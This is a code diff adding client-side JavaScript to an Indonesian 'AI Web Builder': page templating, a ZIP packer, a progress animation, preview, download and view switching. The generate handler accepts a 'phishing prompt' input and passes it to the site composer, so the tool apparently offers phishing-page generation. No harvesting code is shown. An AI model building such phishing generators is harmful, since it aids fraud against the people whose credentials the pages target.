+  const html=`<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>${brand} — ${c.kicker}</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+<nav>
+  <a class="logo" href="#"><b>${brand.split(' ')[0].toUpperCase()}</b>&nbsp;${brand.split(' ').slice(1).join(' ')||''}</a>
+  <div class="nav-links">${navLinks.map(l=>`<a href="#${l.toLowerCase()}">${l}</a>`).join('')}</div>
+  <a class="btn btn-p" href="#kontak">${c.cta1}</a>
+</nav>
+${body}
+<footer>© <span id="yr"></span> ${brand}. Dibuat dengan ❤ menggunakan FIRDHAN AI Web Builder.</footer>
+<script src="script.js"><\/script>
+</body>
+</html>`;
+  const css=genCSS({style,accent:accentKey});
+  const js=genJS();
+  const combined=html.replace('<link rel="stylesheet" href="style.css"/>','<style>\n'+css+'</style>')
+                     .replace('<script src="script.js"><\/script>','<script>\n'+js+'<\/script>');
+  return {html,css,js,combined};
+}
+function cap(s){return s.charAt(0).toUpperCase()+s.slice(1)}
+
+const CRC_T=(()=>{const t=new Uint32Array(256);for(let n=0;n<256;n++){let c=n;for(let k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c}return t})();
+function crc32(u8){let c=0xFFFFFFFF;for(let i=0;i<u8.length;i++)c=CRC_T[(c^u8[i])&255]^(c>>>8);return (c^0xFFFFFFFF)>>>0}
+function zipStore(files){
+  const enc=new TextEncoder(),chunks=[],cd=[];
+  let off=0;
+  for(const [name,data] of files){
+    const n=enc.encode(name),d=enc.encode(data),crc=crc32(d);
+    const lh=new DataView(new ArrayBuffer(30));
+    lh.setUint32(0,0x04034b50,true);lh.setUint16(4,20,true);lh.setUint16(6,0,true);
+    lh.setUint16(8,0,true);lh.setUint32(14,crc,true);
+    lh.setUint32(18,d.length,true);lh.setUint32(22,d.length,true);lh.setUint16(26,n.length,true);
+    chunks.push(new Uint8Array(lh.buffer),n,d);
+    cd.push({n,d,crc,off});off+=30+n.length+d.length;
+  }
+  const cdStart=off;
+  for(const e of cd){
+    const ch=new DataView(new ArrayBuffer(46));
+    ch.setUint32(0,0x02014b50,true);ch.setUint16(4,20,true);ch.setUint16(6,20,true);
+    ch.setUint32(16,e.crc,true);ch.setUint32(20,e.d.length,true);ch.setUint32(24,e.d.length,true);
+    ch.setUint16(28,e.n.length,true);ch.setUint32(42,e.off,true);
+    chunks.push(new Uint8Array(ch.buffer),e.n);off+=46+e.n.length;
+  }
+  const end=new DataView(new ArrayBuffer(22));
+  end.setUint32(0,0x06054b50,true);end.setUint16(8,cd.length,true);end.setUint16(10,cd.length,true);
+  end.setUint32(12,off-cdStart,true);end.setUint32(16,cdStart,true);
+  chunks.push(new Uint8Array(end.buffer));
+  return new Blob(chunks,{type:'application/zip'});
+}
+
+let lastResult=null;
+const PHASES=[
+  ['Menganalisis intent & kata kunci…',16],
+  ['Menyusun struktur section…',34],
+  ['Mengkomposisi tema & palet warna…',52],
+  ['Menulis style.css…',70],
+  ['Menulis script.js…',84],
+  ['Merender pratinjau…',96],
+  ['✓ Build selesai!',100]
+];
+$('genBtn').addEventListener('click',async()=>{
+  const prompt=$('prompt').value.trim();
+  const phishingPrompt=$('phishingPrompt').value.trim();
+
+  if(!prompt && !phishingPrompt){
+    const s=$('status');s.className='status err';s.textContent='⚠ Mohon isi deskripsi website atau prompt phishing terlebih dahulu!';
+    return;
+  }
+  const btn=$('genBtn');btn.disabled=true;
+  const accent=$('accentSel').value;
+  const brand=$('brandInput').value.trim();
+  const st=$('status'),pb=$('pbar'),pf=$('pbarFill');
+  $('miniLog').innerHTML='';pb.classList.add('show');
+  logLine('▶','<b>build dimulai</b> — engine v2.0');
+  const t0=performance.now();
+
+  for(const [msg,pct] of PHASES){
+    st.className='status';st.innerHTML=msg+' <span class="cur"></span>';
+    pf.style.width=pct+'%';
+    logLine('»',msg.replace('…',''));
+    await wait(240+Math.random()*260);
+    if(pct===100)st.className='status ok';
+  }
+
+  lastResult=composeSite(prompt,curStyle,accent,brand,phishingPrompt);
+  $('previewFrame').srcdoc=lastResult.combined;
+  $('frameWrap').classList.add('has-preview');
+  $('codePanel').classList.add('has-code');
+  setCodeTab('html');
+
+  const kb=(lastResult.combined.length/1024).toFixed(1);
+  const secs=((performance.now()-t0)/1000).toFixed(2);
+  logLine('✓','build selesai dalam '+secs+'s · '+kb+' KB · 3 file');
+  toast('🎉 Website berhasil di-generate!');
+  btn.disabled=false;
+  $('dlZipBtn').disabled=false;$('dlHtmlBtn').disabled=false;
+  $('refreshBtn').disabled=false;
+});
+
+$('refreshBtn').addEventListener('click',()=>{
+  if(!lastResult)return;
+  $('previewFrame').srcdoc=lastResult.combined;
+  toast('↻ Pratinjau dimuat ulang');
+});
+
+let curTab='html';
+function setCodeTab(f){
+  curTab=f;
+  [...$('codeTabs').children].forEach(t=>t.classList.toggle('on',t.dataset.f===f));
+  $('codeView').textContent=lastResult?lastResult[f==='html'?'html':f]:'';
+}
+$('codeTabs').addEventListener('click',e=>{
+  const t=e.target.closest('.tab');if(!t||!lastResult)return;
+  setCodeTab(t.dataset.f);
+});
+$('copyCodeBtn').addEventListener('click',async()=>{
+  if(!lastResult)return;
+  const fname={html:'index.html',css:'style.css',js:'script.js'}[curTab];
+  await navigator.clipboard.writeText(lastResult[curTab==='html'?'html':curTab]);
+  toast('📋 '+fname+' tersalin ke clipboard');
+});
+
+$('dlZipBtn').addEventListener('click',()=>{
+  if(!lastResult)return;
+  const blob=zipStore([['index.html',lastResult.html],['style.css',lastResult.css],['script.js',lastResult.js]]);
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);a.download=slug($('brandInput').value||'website')+'-firdhan-ai.zip';a.click();
+  setTimeout(()=>URL.revokeObjectURL(a.href),4000);
+  toast('⬇ ZIP berisi 3 file sedang diunduh');
+});
+$('dlHtmlBtn').addEventListener('click',()=>{
+  if(!lastResult)return;
+  const blob=new Blob([lastResult.combined],{type:'text/html'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);a.download=slug($('brandInput').value||'website')+'.html';a.click();
+  setTimeout(()=>URL.revokeObjectURL(a.href),4000);
+  toast('⬇ Single HTML sedang diunduh');
+});
+function slug(s){return s.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,'')||'website'}
+</script>
+<script>
+(function(){
+  function setBuilderStyles(enabled){
+    const styles=document.getElementById('builderStyles');
+    if(styles) styles.media=enabled?'all':'not all';
+  }
+  function showBuilder(){
+    setBuilderStyles(true);
+    document.body.classList.add('builder-mode');
+    document.body.classList.remove('chat-mode');
+    if(window.location.hash!=='#builder') window.location.hash='builder';
+  }
+  function showChat(){
+    setBuilderStyles(false);
+    document.body.classList.remove('builder-mode');
+    document.body.classList.add('chat-mode');
+    if(window.location.hash!=='#chat') window.location.hash='chat';
+  }
+  window.showBuilderView=showBuilder; window.showChatView=showChat;
+  document.addEventListener('click',function(event){
+    const back=event.target.closest('.back-link');
+    if(back){event.preventDefault();showChat();}
+  });
+  function syncView(){if(window.location.hash==='#builder')showBuilder();else showChat();}
+  window.addEventListener('hashchange',syncView);
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',syncView);
+  else syncView();
+})();
+</script></body></html>
